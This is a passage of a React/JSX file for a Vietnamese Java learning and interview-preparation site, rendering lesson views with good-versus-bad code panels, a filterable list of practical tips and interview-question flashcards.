                    background: 'rgba(13, 17, 23, 0.85)',
                    border: `1px solid ${activeModule.accentColor}35`,
                    borderRadius: '16px',
                    padding: '30px 32px',
                    boxShadow: '0 12px 40px rgba(0, 0, 0, 0.4)',
                    backdropFilter: 'blur(10px)'
                  }}>
                    {/* Breadcrumbs Tag */}
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '8px',
                      fontSize: '12.5px',
                      color: 'rgba(255, 255, 255, 0.5)',
                      marginBottom: '14px'
                    }}>
                      <span>Kho Tri Thức</span>
                      <span>/</span>
                      <span style={{ color: activeModule.accentColor }}>{activeModule.title}</span>
                      <span>/</span>
                      <span style={{ color: '#ffffff' }}>Bài #{String(currentTopicIndex + 1).padStart(2, '0')}</span>
                    </div>

                    {/* Topic Header Block */}
                    <div style={{ marginBottom: '22px', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '20px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap', marginBottom: '10px' }}>
                        <span style={{
                          fontSize: '12px',
                          fontWeight: 800,
                          padding: '3px 10px',
                          borderRadius: '6px',
                          background: activeModule.accentColor,
                          color: '#000000'
                        }}>
                          {activeTopic.badge}
                        </span>
                        <span style={{
                          fontSize: '12px',
                          padding: '3px 10px',
                          borderRadius: '6px',
                          background: 'rgba(255, 255, 255, 0.06)',
                          color: 'rgba(255, 255, 255, 0.75)'
                        }}>
                          ⏱️ 5 phút đọc chuyên sâu
                        </span>
                      </div>

                      <h1 style={{
                        margin: '8px 0 14px 0',
                        fontSize: '1.95rem',
                        fontWeight: 900,
                        color: '#ffffff',
                        lineHeight: 1.3
                      }}>
                        {activeTopic.title}
                      </h1>

                      {/* TL;DR Executive Takeaway Box */}
                      <div style={{
                        padding: '14px 18px',
                        borderRadius: '10px',
                        background: 'linear-gradient(135deg, rgba(52, 211, 153, 0.08) 0%, rgba(56, 189, 248, 0.05) 100%)',
                        border: '1px solid rgba(52, 211, 153, 0.3)',
                        display: 'flex',
                        alignItems: 'flex-start',
                        gap: '12px'
                      }}>
                        <span style={{ fontSize: '20px', marginTop: '-2px' }}>⚡</span>
                        <div style={{ fontSize: '14.5px', color: '#a7f3d0', fontWeight: 600, lineHeight: 1.6 }}>
                          <strong>Tóm tắt cốt lõi:</strong> {activeTopic.summary}
                        </div>
                      </div>
                    </div>

                    {/* Section 1: Detailed Explanation (Formatted) */}
                    <div style={{ marginBottom: '28px' }}>
                      <div style={{
                        fontSize: '13px',
                        fontWeight: 800,
                        color: activeModule.accentColor,
                        textTransform: 'uppercase',
                        letterSpacing: '0.06em',
                        marginBottom: '12px',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px'
                      }}>
                        <span>📖</span>
                        <span>Phân Tích Bản Chất Dưới Nắp Ca-pô:</span>
                      </div>

                      <FormattedDocContent
                        text={activeTopic.explanation}
                        accentColor={activeModule.accentColor}
                      />
                    </div>

                    {/* Section 2: ASCII Architecture Diagram (If Present) */}
                    {activeTopic.asciiDiagram && (
                      <div style={{
                        marginBottom: '28px',
                        background: '#050a14',
                        border: '1px solid rgba(56, 189, 248, 0.3)',
                        borderRadius: '12px',
                        overflow: 'hidden',
                        boxShadow: '0 8px 24px rgba(0, 0, 0, 0.5)'
                      }}>
                        {/* Terminal Header */}
                        <div style={{
                          padding: '10px 16px',
                          background: 'rgba(255, 255, 255, 0.04)',
                          borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'space-between'
                        }}>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ff5f56', display: 'inline-block' }} />
                            <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ffbd2e', display: 'inline-block' }} />
                            <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#27c93f', display: 'inline-block' }} />
                            <span style={{ fontSize: '12px', fontWeight: 800, color: '#38bdf8', marginLeft: '6px' }}>
                              📊 SƠ ĐỒ CƠ CHẾ BỘ NHỚ / KIẾN TRÚC HỆ THỐNG
                            </span>
                          </div>
                          <button
                            onClick={() => handleCopyCode(activeTopic.asciiDiagram || '', `diag-${activeTopic.id}`)}
                            style={{
                              padding: '4px 10px',
                              borderRadius: '6px',
                              background: copiedSnippetId === `diag-${activeTopic.id}` ? 'rgba(52, 211, 153, 0.2)' : 'rgba(255, 255, 255, 0.06)',
                              border: `1px solid ${copiedSnippetId === `diag-${activeTopic.id}` ? '#34d399' : 'rgba(255, 255, 255, 0.12)'}`,
                              color: copiedSnippetId === `diag-${activeTopic.id}` ? '#34d399' : 'rgba(255, 255, 255, 0.7)',
                              fontSize: '11px',
                              cursor: 'pointer'
                            }}
                          >
                            {copiedSnippetId === `diag-${activeTopic.id}` ? '✓ Đã chép' : '📋 Copy Sơ Đồ'}
                          </button>
                        </div>
                        <pre style={{
                          margin: 0,
                          padding: '18px 20px',
                          fontSize: '13px',
                          color: '#38bdf8',
                          background: 'transparent',
                          overflowX: 'auto',
                          lineHeight: 1.5,
                          fontFamily: 'Consolas, Monaco, "Courier New", monospace'
                        }}>
                          {activeTopic.asciiDiagram}
                        </pre>
                      </div>
                    )}

                    {/* Section 3: Side-by-Side Code Comparison */}
                    <div style={{ marginBottom: '28px' }}>
                      <div style={{
                        fontSize: '13px',
                        fontWeight: 800,
                        color: 'rgba(255, 255, 255, 0.85)',
                        textTransform: 'uppercase',
                        letterSpacing: '0.06em',
                        marginBottom: '14px',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px'
                      }}>
                        <span>⚔️</span>
                        <span>Đối Chiếu Thực Chiến: Nghiệp Dư vs Chuẩn Doanh Nghiệp:</span>
                      </div>

                      <div style={{
                        display: 'grid',
                        gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))',
                        gap: '16px'
                      }}>
                        {/* Bad Code Box */}
                        {activeTopic.badCode && (
                          <div style={{
                            background: 'rgba(248, 113, 113, 0.03)',
                            border: '1px solid rgba(248, 113, 113, 0.3)',
                            borderRadius: '12px',
                            overflow: 'hidden'
                          }}>
                            <div style={{
                              padding: '10px 14px',
                              background: 'rgba(248, 113, 113, 0.12)',
                              borderBottom: '1px solid rgba(248, 113, 113, 0.25)',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'space-between'
                            }}>
                              <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                                <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#f87171', display: 'inline-block' }} />
                                <span style={{ fontSize: '13px', fontWeight: 800, color: '#f87171' }}>
                                  {activeTopic.badCodeTitle || '❌ Cách Làm Nghiệp Dư / Code Mùi'}
                                </span>
                              </div>
                              <button
                                onClick={() => handleCopyCode(activeTopic.badCode || '', `bad-${activeTopic.id}`)}
                                style={{
                                  padding: '3px 8px',
                                  borderRadius: '5px',
                                  background: copiedSnippetId === `bad-${activeTopic.id}` ? 'rgba(52, 211, 153, 0.2)' : 'rgba(255, 255, 255, 0.06)',
                                  border: `1px solid ${copiedSnippetId === `bad-${activeTopic.id}` ? '#34d399' : 'rgba(255, 255, 255, 0.12)'}`,
                                  color: copiedSnippetId === `bad-${activeTopic.id}` ? '#34d399' : 'rgba(255, 255, 255, 0.7)',
                                  fontSize: '11px',
                                  cursor: 'pointer'
                                }}
                              >
                                {copiedSnippetId === `bad-${activeTopic.id}` ? '✓ Đã chép' : '📋 Copy'}
                              </button>
                            </div>
                            <pre style={{
                              margin: 0,
                              padding: '14px 16px',
                              fontSize: '13px',
                              background: 'transparent',
                              color: '#fca5a5',
                              overflowX: 'auto',
                              lineHeight: 1.55,
                              fontFamily: 'Consolas, Monaco, "Courier New", monospace'
                            }}>
                              <code>{activeTopic.badCode}</code>
                            </pre>
                          </div>
                        )}

                        {/* Good Code Box */}
                        <div style={{
                          background: 'rgba(52, 211, 153, 0.03)',
                          border: '1px solid rgba(52, 211, 153, 0.35)',
                          borderRadius: '12px',
                          overflow: 'hidden'
                        }}>
                          <div style={{
                            padding: '10px 14px',
                            background: 'rgba(52, 211, 153, 0.12)',
                            borderBottom: '1px solid rgba(52, 211, 153, 0.25)',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'space-between'
                          }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                              <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#34d399', display: 'inline-block' }} />
                              <span style={{ fontSize: '13px', fontWeight: 800, color: '#34d399' }}>
                                {activeTopic.goodCodeTitle}
                              </span>
                            </div>
                            <button
                              onClick={() => handleCopyCode(activeTopic.goodCode, `good-${activeTopic.id}`)}
                              style={{
                                padding: '3px 8px',
                                borderRadius: '5px',
                                background: copiedSnippetId === `good-${activeTopic.id}` ? 'rgba(52, 211, 153, 0.2)' : 'rgba(255, 255, 255, 0.06)',
                                border: `1px solid ${copiedSnippetId === `good-${activeTopic.id}` ? '#34d399' : 'rgba(255, 255, 255, 0.12)'}`,
                                color: copiedSnippetId === `good-${activeTopic.id}` ? '#34d399' : 'rgba(255, 255, 255, 0.7)',
                                fontSize: '11px',
                                cursor: 'pointer'
                              }}
                            >
                              {copiedSnippetId === `good-${activeTopic.id}` ? '✓ Đã chép' : '📋 Copy'}
                            </button>
                          </div>
                          <pre style={{
                            margin: 0,
                            padding: '14px 16px',
                            fontSize: '13px',
                            background: 'transparent',
                            color: '#a7f3d0',
                            overflowX: 'auto',
                            lineHeight: 1.55,
                            fontFamily: 'Consolas, Monaco, "Courier New", monospace'
                          }}>
                            <code>{activeTopic.goodCode}</code>
                          </pre>
                        </div>
                      </div>
                    </div>

                    {/* Section 4: Interview Gold Tip */}
                    <div style={{
                      marginBottom: '32px',
                      padding: '18px 22px',
                      borderRadius: '12px',
                      background: 'linear-gradient(135deg, rgba(251, 191, 36, 0.1) 0%, rgba(245, 158, 11, 0.04) 100%)',
                      border: '1px solid rgba(251, 191, 36, 0.4)',
                      boxShadow: '0 4px 20px rgba(251, 191, 36, 0.08)'
                    }}>
                      <div style={{
                        fontSize: '14px',
                        fontWeight: 800,
                        color: '#fbbf24',
                        marginBottom: '8px',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px'
                      }}>
                        <span>🏆</span>
                        <span>BẪY PHỎNG VẤN & CÁCH TRẢ LỜI ĐIỂM 10:</span>
                      </div>
                      <div style={{ fontSize: '14.5px', color: 'rgba(255, 255, 255, 0.92)', lineHeight: 1.75 }}>
                        {parseInlineMarkdown(activeTopic.interviewTip, '#fbbf24')}
                      </div>
                    </div>

                    {/* Section 5: Pagination Bottom Navigation */}
                    <div style={{
                      paddingTop: '20px',
                      borderTop: '1px solid rgba(255, 255, 255, 0.08)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      flexWrap: 'wrap',
                      gap: '12px'
                    }}>
                      {prevTopic ? (
                        <button
                          onClick={() => {
                            setSelectedTopicId(prevTopic.id);
                            window.scrollTo({ top: 400, behavior: 'smooth' });
                          }}
                          style={{
                            padding: '10px 18px',
                            borderRadius: '10px',
                            background: 'rgba(255, 255, 255, 0.04)',
                            border: '1px solid rgba(255, 255, 255, 0.12)',
                            color: '#ffffff',
                            fontSize: '13.5px',
                            fontWeight: 700,
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '8px',
                            transition: 'all 0.2s ease'
                          }}
                        >
                          <span>⬅️</span>
                          <span>Bài trước: {prevTopic.title.length > 25 ? prevTopic.title.substring(0, 25) + '...' : prevTopic.title}</span>
                        </button>
                      ) : (
                        <div />
                      )}

                      {nextTopic ? (
                        <button
                          onClick={() => {
                            setSelectedTopicId(nextTopic.id);
                            window.scrollTo({ top: 400, behavior: 'smooth' });
                          }}
                          style={{
                            padding: '10px 20px',
                            borderRadius: '10px',
                            background: `linear-gradient(135deg, ${activeModule.accentColor} 0%, #34d399 100%)`,
                            border: 'none',
                            color: '#000000',
                            fontSize: '14px',
                            fontWeight: 800,
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '8px',
                            boxShadow: `0 4px 15px ${activeModule.accentColor}40`,
                            transition: 'all 0.2s ease'
                          }}
                        >
                          <span>Bài tiếp: {nextTopic.title.length > 25 ? nextTopic.title.substring(0, 25) + '...' : nextTopic.title}</span>
                          <span>➡️</span>
                        </button>
                      ) : nextModule ? (
                        <button
                          onClick={() => {
                            setSelectedModuleId(nextModule.id);
                            setSelectedTopicId(nextModule.topics[0].id);
                            window.scrollTo({ top: 400, behavior: 'smooth' });
                          }}
                          style={{
                            padding: '10px 20px',
                            borderRadius: '10px',
                            background: `linear-gradient(135deg, ${nextModule.accentColor} 0%, #38bdf8 100%)`,
                            border: 'none',
                            color: '#000000',
                            fontSize: '14px',
                            fontWeight: 800,
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '8px',
                            boxShadow: `0 4px 15px ${nextModule.accentColor}40`,
                            transition: 'all 0.2s ease'
                          }}
                        >
                          <span>Hoàn thành module! Sang {nextModule.title}</span>
                          <span>🚀</span>
                        </button>
                      ) : null}
                    </div>
                  </div>
                </div>
              </div>
            );
          })()}

          {/* ======================================================== */}
          {/* TAB: 50 BÍ QUYẾT ĐI LÀM THỰC CHIẾN */}
          {/* ======================================================== */}
          {activeMainTab === 'tips50' && (
            <div>
              {/* Category Filter & Search Bar */}
              <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap', marginBottom: '22px', alignItems: 'center', justifyContent: 'space-between' }}>
                <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                  {['All', 'Core Java & JVM', 'Spring Boot & REST', 'Database & JPA', 'Testing & QA', 'Clean Code & Logging', 'Git & Tác Phong'].map(cat => (
                    <button
                      key={cat}
                      onClick={() => setTipsCategoryFilter(cat)}
                      style={{
                        padding: '7px 16px',
                        borderRadius: '8px',
                        background: tipsCategoryFilter === cat ? 'rgba(236, 72, 153, 0.2)' : 'rgba(255, 255, 255, 0.04)',
                        border: `1px solid ${tipsCategoryFilter === cat ? '#ec4899' : 'rgba(255, 255, 255, 0.1)'}`,
                        color: tipsCategoryFilter === cat ? '#ec4899' : 'rgba(255, 255, 255, 0.75)',
                        fontSize: '13.5px',
                        fontWeight: tipsCategoryFilter === cat ? 800 : 500,
                        cursor: 'pointer',
                        transition: 'all 0.2s ease'
                      }}
                    >
                      {cat === 'All' ? `Tất cả (${FIFTY_PRACTICAL_TIPS.length})` : cat}
                    </button>
                  ))}
                </div>

                <div style={{ minWidth: '280px', flex: '1 1 auto', maxWidth: '420px' }}>
                  <input
                    type="text"
                    placeholder="Tìm nhanh trong 50 mẹo (vd: N+1, BigDecimal, final, log)..."
                    value={tipsSearchQuery}
                    onChange={(e) => setTipsSearchQuery(e.target.value)}
                    style={{
                      width: '100%',
                      padding: '9px 16px',
                      borderRadius: '8px',
                      background: 'rgba(255, 255, 255, 0.05)',
                      border: '1px solid rgba(255, 255, 255, 0.15)',
                      color: '#ffffff',
                      fontSize: '14px',
                      outline: 'none'
                    }}
                  />
                </div>
              </div>

              {/* Tips Stats Bar */}
              <div style={{
                marginBottom: '18px',
                fontSize: '14px',
                color: 'rgba(255, 255, 255, 0.75)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '8px'
              }}>
                <span>
                  Đang hiển thị <strong>{filteredTips.length}</strong> / 50 bí quyết vàng
                </span>
                <span style={{ fontSize: '13px', color: '#ec4899', fontWeight: 600 }}>
                  ⚡ Click vào từng thẻ để xem chi tiết & code mẫu
                </span>
              </div>

              {/* Tips List */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {filteredTips.map((tip) => {
                  const isExpanded = expandedTipId === tip.id;
                  const priorityColor =
                    tip.priority === 'Bắt Buộc' ? '#ef4444' :
                    tip.priority === 'Hiệu Năng' ? '#38bdf8' :
                    tip.priority === 'Kiến Trúc' ? '#a855f7' : '#10b981';

                  return (
                    <div
                      key={tip.id}
                      style={{
                        background: 'rgba(15, 23, 42, 0.6)',
                        border: `1px solid ${isExpanded ? '#ec4899' : 'rgba(255, 255, 255, 0.08)'}`,
                        borderRadius: '10px',
                        overflow: 'hidden',
                        transition: 'all 0.2s ease',
                        boxShadow: isExpanded ? '0 4px 20px rgba(236, 72, 153, 0.15)' : 'none'
                      }}
                    >
                      {/* Header Row */}
                      <div
                        onClick={() => setExpandedTipId(isExpanded ? null : tip.id)}
                        style={{
                          padding: '15px 20px',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'space-between',
                          cursor: 'pointer',
                          background: isExpanded ? 'rgba(236, 72, 153, 0.08)' : 'transparent',
                          gap: '12px'
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
                          <span style={{
                            width: '28px',
                            height: '28px',
                            borderRadius: '50%',
                            background: 'rgba(255, 255, 255, 0.1)',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            fontSize: '13px',
                            fontWeight: 800,
                            color: '#ffffff'
                          }}>
                            {tip.id}
                          </span>

                          <span style={{
                            fontSize: '12px',
                            fontWeight: 800,
                            padding: '3px 8px',
                            borderRadius: '4px',
                            background: 'rgba(255, 255, 255, 0.06)',
                            color: 'rgba(255, 255, 255, 0.8)'
                          }}>
                            {tip.category}
                          </span>

                          <span style={{
                            fontSize: '12px',
                            fontWeight: 800,
                            padding: '3px 8px',
                            borderRadius: '4px',
                            background: `${priorityColor}22`,
                            color: priorityColor,
                            border: `1px solid ${priorityColor}44`
                          }}>
                            {tip.priority}
                          </span>

                          <span style={{ fontSize: '15px', fontWeight: 700, color: '#ffffff' }}>
                            {tip.title}
                          </span>
                        </div>

                        <span style={{ color: '#ec4899', fontSize: '20px', fontWeight: 800, flexShrink: 0 }}>
                          {isExpanded ? '−' : '+'}
                        </span>
                      </div>

                      {/* Expandable Body */}
                      {isExpanded && (
                        <div style={{ padding: '18px 22px', borderTop: '1px solid rgba(255, 255, 255, 0.06)' }}>
                          {/* Summary Banner */}
                          <div style={{
                            padding: '12px 16px',
                            borderRadius: '8px',
                            background: 'rgba(236, 72, 153, 0.06)',
                            border: '1px solid rgba(236, 72, 153, 0.25)',
                            fontSize: '14.5px',
                            color: 'rgba(255, 255, 255, 0.95)',
                            lineHeight: 1.6,
                            marginBottom: '14px'
                          }}>
                            ⚡ <strong>Bản chất vấn đề:</strong> {tip.summary}
                          </div>

                          {/* Detail Explanation */}
                          <div style={{
                            fontSize: '15px',
                            color: 'rgba(255, 255, 255, 0.88)',
                            lineHeight: 1.75,
                            marginBottom: (tip.codeBad || tip.codeGood) ? '16px' : '0'
                          }}>
                            {tip.detail}
                          </div>

                          {/* Code Comparison (if available) */}
                          {(tip.codeBad || tip.codeGood) && (
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '14px' }}>
                              {tip.codeBad && (
                                <div style={{
                                  background: 'rgba(248, 113, 113, 0.05)',
                                  border: '1px solid rgba(248, 113, 113, 0.25)',
                                  borderRadius: '8px',
                                  overflow: 'hidden'
                                }}>
                                  <div style={{ background: 'rgba(248, 113, 113, 0.15)', padding: '8px 12px', fontSize: '13px', fontWeight: 700, color: '#f87171' }}>
                                    ❌ Sai lầm thường gặp
                                  </div>
                                  <pre style={{ margin: 0, padding: '12px', fontSize: '13px', background: 'transparent', color: '#fca5a5', overflowX: 'auto', lineHeight: 1.5 }}>
                                    <code>{tip.codeBad}</code>
                                  </pre>
                                </div>
                              )}

                              {tip.codeGood && (
                                <div style={{
                                  background: 'rgba(52, 211, 153, 0.05)',
                                  border: '1px solid rgba(52, 211, 153, 0.25)',
                                  borderRadius: '8px',
                                  overflow: 'hidden'
                                }}>
                                  <div style={{ background: 'rgba(52, 211, 153, 0.15)', padding: '8px 12px', fontSize: '13px', fontWeight: 700, color: '#34d399' }}>
                                    ✅ Chuẩn đi làm (Best Practice)
                                  </div>
                                  <pre style={{ margin: 0, padding: '12px', fontSize: '13px', background: 'transparent', color: '#a7f3d0', overflowX: 'auto', lineHeight: 1.5 }}>
                                    <code>{tip.codeGood}</code>
                                  </pre>
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* ======================================================== */}
          {/* TAB 2: PHỎNG VẤN TRÚNG TỦ */}
          {/* ======================================================== */}
          {activeMainTab === 'interview' && (
            <div>
              {/* Filter and Search Bar */}
              <div style={{
                background: 'rgba(15, 23, 42, 0.7)',
                border: '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '20px',
                marginBottom: '22px'
              }}>
                {/* Search Bar & Stats */}
                <div style={{ display: 'flex', gap: '14px', flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between', marginBottom: '18px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <span style={{
                      padding: '6px 12px',
                      borderRadius: '6px',
                      background: 'rgba(52, 211, 153, 0.15)',
                      border: '1px solid rgba(52, 211, 153, 0.3)',
                      color: '#34d399',
                      fontSize: '13.5px',
                      fontWeight: 800
                    }}>
                      🎯 Đang hiển thị {filteredInterviewQuestions.length} / {INTERVIEW_QUESTIONS.length} câu hỏi
                    </span>
                    <span style={{ fontSize: '13px', color: 'rgba(255, 255, 255, 0.65)' }}>
                      (Phân loại theo mức độ và chủ đề)
                    </span>
                  </div>

                  <div style={{ minWidth: '280px', flex: '1 1 auto', maxWidth: '420px' }}>
                    <input
                      type="text"
                      placeholder="Tìm câu hỏi, từ khóa, bẫy phỏng vấn..."
                      value={interviewSearch}
                      onChange={(e) => setInterviewSearch(e.target.value)}
                      style={{
                        width: '100%',
                        padding: '9px 16px',
                        borderRadius: '8px',
                        background: 'rgba(255, 255, 255, 0.05)',
                        border: '1px solid rgba(255, 255, 255, 0.15)',
                        color: '#ffffff',
                        fontSize: '14px',
                        outline: 'none'
                      }}
                    />
                  </div>
                </div>

                {/* Level Filters */}
                <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', alignItems: 'center', marginBottom: '14px' }}>
                  <span style={{ fontSize: '12.5px', fontWeight: 800, textTransform: 'uppercase', color: 'rgba(255, 255, 255, 0.6)', marginRight: '4px' }}>
                    Cấp Độ:
                  </span>
                  {[
                    { id: 'All', label: 'Tất cả Level' },
                    { id: 'Intern', label: '🌱 Intern (Thực tập sinh)' },
                    { id: 'Fresher', label: '🚀 Fresher (Mới ra trường)' },
                    { id: 'Junior', label: '⚡ Junior (1-2 năm kn)' }
                  ].map(lvl => (
                    <button
                      key={lvl.id}
                      onClick={() => setSelectedLevelFilter(lvl.id)}
                      style={{
                        padding: '6px 14px',
                        borderRadius: '6px',
                        background: selectedLevelFilter === lvl.id ? 'rgba(56, 189, 248, 0.2)' : 'rgba(255, 255, 255, 0.04)',
                        border: `1px solid ${selectedLevelFilter === lvl.id ? '#38bdf8' : 'rgba(255, 255, 255, 0.08)'}`,
                        color: selectedLevelFilter === lvl.id ? '#38bdf8' : 'rgba(255, 255, 255, 0.75)',
                        fontSize: '13px',
                        fontWeight: selectedLevelFilter === lvl.id ? 800 : 500,
                        cursor: 'pointer',
                        transition: 'all 0.15s ease'
                      }}
                    >
                      {lvl.label}
                    </button>
                  ))}
                </div>

                {/* Category Filters */}
                <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', alignItems: 'center' }}>
                  <span style={{ fontSize: '12.5px', fontWeight: 800, textTransform: 'uppercase', color: 'rgba(255, 255, 255, 0.6)', marginRight: '4px' }}>
                    Chủ Đề:
                  </span>
                  {[
                    'All',
                    'Core Java',
                    'Spring Boot',
                    'Database / JPA',
                    'Concurrency & JVM',
                    'Testing & QA',
                    'Hạ Tầng & Security',
                    'Kỹ Năng & Live Coding'
                  ].map(cat => (
                    <button
                      key={cat}
                      onClick={() => setSelectedCategory(cat)}
                      style={{
                        padding: '6px 14px',
                        borderRadius: '6px',
                        background: selectedCategory === cat ? 'rgba(52, 211, 153, 0.2)' : 'rgba(255, 255, 255, 0.04)',
                        border: `1px solid ${selectedCategory === cat ? '#34d399' : 'rgba(255, 255, 255, 0.08)'}`,
                        color: selectedCategory === cat ? '#34d399' : 'rgba(255, 255, 255, 0.75)',
                        fontSize: '13px',
                        fontWeight: selectedCategory === cat ? 800 : 500,
                        cursor: 'pointer',
                        transition: 'all 0.15s ease'
                      }}
                    >
                      {cat === 'All' ? 'Tất cả chủ đề' : cat}
                    </button>
                  ))}
                </div>
              </div>

              {/* Question Flashcards */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {filteredInterviewQuestions.length === 0 ? (
                  <div style={{
                    padding: '40px',
                    textAlign: 'center',
                    background: 'rgba(15, 23, 42, 0.4)',
                    borderRadius: '10px',
                    border: '1px dashed rgba(255, 255, 255, 0.15)',
                    color: 'rgba(255, 255, 255, 0.7)',
                    fontSize: '14.5px'
                  }}>
                    🔍 Không tìm thấy câu hỏi nào phù hợp với bộ lọc hiện tại. Thử chọn "Tất cả" hoặc nhập từ khóa khác!
                  </div>
                ) : (
                  filteredInterviewQuestions.map((q) => {
                    const isExpanded = expandedQuestionId === q.id;
                    const levelBadgeColor = q.level === 'Intern' ? '#34d399' :
                                           q.level === 'Fresher' ? '#38bdf8' : '#a78bfa';
                    const catBadgeColor = q.category === 'Core Java' ? '#38bdf8' :
                                         q.category === 'Spring Boot' ? '#fbbf24' :
                                         q.category === 'Database / JPA' ? '#f97316' :
                                         q.category === 'Concurrency & JVM' ? '#ec4899' :
                                         q.category === 'Testing & QA' ? '#2dd4bf' :
                                         q.category === 'Hạ Tầng & Security' ? '#eab308' : '#34d399';

                    return (
                      <div
                        key={q.id}
                        style={{
                          background: 'rgba(15, 23, 42, 0.65)',
                          border: `1px solid ${isExpanded ? '#34d399' : 'rgba(255, 255, 255, 0.08)'}`,
                          borderRadius: '10px',
                          overflow: 'hidden',
                          transition: 'all 0.2s ease'
                        }}
                      >
                        <div
                          onClick={() => setExpandedQuestionId(isExpanded ? null : q.id)}
                          style={{
                            padding: '16px 20px',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'space-between',
                            cursor: 'pointer',
                            background: isExpanded ? 'rgba(52, 211, 153, 0.08)' : 'transparent'
                          }}
                        >
                          <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap', flex: 1, marginRight: '16px' }}>
                            <span style={{
                              fontSize: '12px',
                              fontWeight: 800,
                              padding: '3px 9px',
                              borderRadius: '4px',
                              background: `${levelBadgeColor}20`,
                              border: `1px solid ${levelBadgeColor}50`,
                              color: levelBadgeColor,
                              textTransform: 'uppercase'
                            }}>
                              {q.level}
                            </span>

                            <span style={{
                              fontSize: '12px',
                              fontWeight: 700,
                              padding: '3px 9px',
                              borderRadius: '4px',
                              background: `${catBadgeColor}15`,
                              border: `1px solid ${catBadgeColor}35`,
                              color: catBadgeColor
                            }}>
                              {q.category}
                            </span>

                            <span style={{ fontSize: '15.5px', fontWeight: 700, color: '#ffffff', lineHeight: 1.45 }}>
                              {q.question}
                            </span>
                          </div>

                          <div style={{
                            width: '28px',
                            height: '28px',
                            borderRadius: '50%',
                            background: isExpanded ? 'rgba(52, 211, 153, 0.2)' : 'rgba(255, 255, 255, 0.05)',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            color: isExpanded ? '#34d399' : 'rgba(255, 255, 255, 0.6)',
                            fontSize: '18px',
                            fontWeight: 800,
                            flexShrink: 0
                          }}>
                            {isExpanded ? '−' : '+'}
                          </div>
                        </div>

                        {isExpanded && (
                          <div style={{ padding: '18px 22px', borderTop: '1px solid rgba(255, 255, 255, 0.06)' }}>
                            <div style={{ marginBottom: '14px' }}>
                              <div style={{ fontSize: '12.5px', fontWeight: 800, textTransform: 'uppercase', color: '#34d399', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                <span>🎯</span> Câu trả lời 30 giây (Elevator Pitch)
                              </div>
                              <div style={{ fontSize: '15px', color: 'rgba(255, 255, 255, 0.92)', lineHeight: 1.7 }}>
                                {q.shortAnswer}
                              </div>
                            </div>

                            <div style={{
                              padding: '14px 16px',
                              borderRadius: '8px',
                              background: 'rgba(56, 189, 248, 0.06)',
                              border: '1px solid rgba(56, 189, 248, 0.2)',
                              marginBottom: '12px'
                            }}>
                              <div style={{ fontSize: '12.5px', fontWeight: 800, textTransform: 'uppercase', color: '#38bdf8', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                <span>🧠</span> Dưới nắp ca-pô (Senior Deep Dive)
                              </div>
                              <div style={{ fontSize: '14.5px', color: 'rgba(255, 255, 255, 0.88)', lineHeight: 1.7 }}>
                                {q.seniorDeepDive}
                              </div>
                            </div>

                            <div style={{
                              padding: '12px 16px',
                              borderRadius: '8px',
                              background: 'rgba(248, 113, 113, 0.08)',
                              border: '1px solid rgba(248, 113, 113, 0.25)'
                            }}>
                              <div style={{ fontSize: '12.5px', fontWeight: 800, textTransform: 'uppercase', color: '#f87171', marginBottom: '4px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                <span>⚠️</span> Bẫy phỏng vấn viên sẽ hỏi tiếp
                              </div>
                              <div style={{ fontSize: '14px', color: '#fca5a5', lineHeight: 1.6 }}>
                                {q.trapWarning}
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          )}

          {/* ======================================================== */}
          {/* TAB 3: TRƯỜNG HỌC VS ĐI LÀM (CODE BATTLES) */}
          {/* ======================================================== */}
          {activeMainTab === 'battles' && (
            <div>
